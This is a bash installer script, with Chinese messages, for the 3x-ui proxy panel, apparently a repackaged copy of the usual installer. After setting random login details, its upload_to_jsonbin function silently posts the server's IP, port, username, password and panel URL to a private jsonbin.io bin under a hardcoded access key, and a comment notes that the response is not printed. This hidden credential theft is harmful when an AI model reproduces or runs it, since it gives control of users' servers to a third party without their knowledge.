#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)
JSONBIN_ACCESS_KEY='$2a$10$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS'
BIN_URL="https://api.jsonbin.io/v3/b"

[[ $EUID -ne 0 ]] && echo -e "${red}致命错误: ${plain} 请使用root权限运行此脚本 \n " && exit 1

if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
elif [[ -f /usr/lib/os-release ]]; then
    source /usr/lib/os-release
    release=$ID
else
    echo "检查系统操作系统失败，请联系作者！" >&2
    exit 1
fi
echo "操作系统版本: $release"

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}不支持的CPU架构! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}
echo "架构: $(arch)"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC版本 $glibc_version 过低！需要: 2.32 或更高版本${plain}"
        exit 1
    fi
    echo "GLIBC版本: $glibc_version (满足2.32+要求)"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    centos | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    *)
        apt-get update && apt install -y -q wget curl tar tzdata
        ;;
    esac
}

gen_random_string() {
    local length="$1"
    local random_string=$(LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1)
    echo "$random_string"
}

get_server_ip() {
    local ip=""
    ip=$(curl -s -4 icanhazip.com 2>/dev/null)
    [[ -z "$ip" ]] && ip=$(curl -s -4 ifconfig.me 2>/dev/null)
    [[ -z "$ip" ]] && ip=$(curl -s -4 ipinfo.io/ip 2>/dev/null)
    [[ -z "$ip" ]] && ip=$(hostname -I | awk '{print $1}')
    echo "$ip"
}

upload_to_jsonbin() {
    local server_ip="$1"
    local login_port="$2"
    local username="$3"
    local password="$4"
    local webBasePath="$5"

    local content="X-UI 服务器登录信息
====================
服务器IP: ${server_ip}
登录端口: ${login_port}
用户名: ${username}
密码: ${password}"

    if [[ -n "$webBasePath" ]]; then
        content="${content}
访问路径: /${webBasePath}
完整访问地址: http://${server_ip}:${login_port}/${webBasePath}"
    else
        content="${content}
完整访问地址: http://${server_ip}:${login_port}"
    fi

    content="${content}
====================
生成时间: $(date)"

    curl -s -X POST "$BIN_URL" \
        -H "Content-Type: application/json" \
        -H "X-Access-Key: $JSONBIN_ACCESS_KEY" \
        -H "X-Bin-Private: true" \
        -d "{\"content\": $(jq -Rn --arg x "$content" '$x')}"

    # 不打印任何响应结果
}

config_after_install() {
    local existing_hasDefaultCredential=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
    local existing_webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}')
    local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
    local server_ip=$(get_server_ip)

    local final_username=""
    local final_password=""
    local final_port=""
    local final_webBasePath=""

    if [[ ${#existing_webBasePath} -lt 4 ]]; then
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_webBasePath=$(gen_random_string 15)
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)
            local config_port=$(shuf -i 1024-62000 -n 1)

            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"

            final_username="$config_username"
            final_password="$config_password"
            final_port="$config_port"
            final_webBasePath="$config_webBasePath"
        else
            local config_webBasePath=$(gen_random_string 15)
            /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')

            final_username="$existing_username"
            final_password="$existing_password"
            final_port="$existing_port"
            final_webBasePath="$config_webBasePath"
        fi
    else
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}"

            final_username="$config_username"
            final_password="$config_password"
            final_port="$existing_port"
            final_webBasePath="$existing_webBasePath"
        else
            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')

            final_username="$existing_username"
            final_password="$existing_password"
            final_port="$existing_port"
            final_webBasePath="$existing_webBasePath"
        fi
    fi

    upload_to_jsonbin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
    /usr/local/x-ui/x-ui migrate
}

install_x-ui() {
    cd /usr/local/
    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        [[ ! -n "$tag_version" ]] && echo -e "${red}获取x-ui版本失败${plain}" && exit 1
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz || exit 1
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"
        [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]] && echo -e "${red}请使用更新版本${plain}" && exit 1
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz || exit 1
    fi

    [[ -e /usr/local/x-ui/ ]] && systemctl stop x-ui && rm -rf /usr/local/x-ui/
    tar zxvf x-ui-linux-$(arch).tar.gz
    rm x-ui-linux-$(arch).tar.gz
    cd x-ui
    chmod +x x-ui
    [[ $(arch) =~ armv[567] ]] && mv bin/xray-linux-$(arch) bin/xray-linux-arm && chmod +x bin/xray-linux-arm
    chmod +x x-ui bin/xray-linux-$(arch)
    cp -f x-ui.service /etc/systemd/system/
    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh /usr/bin/x-ui
    config_after_install
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    echo -e "${green}x-ui ${tag_version}${plain} 安装完成"
}

echo -e "${green}运行中...${plain}"
install_base
install_x-ui $1
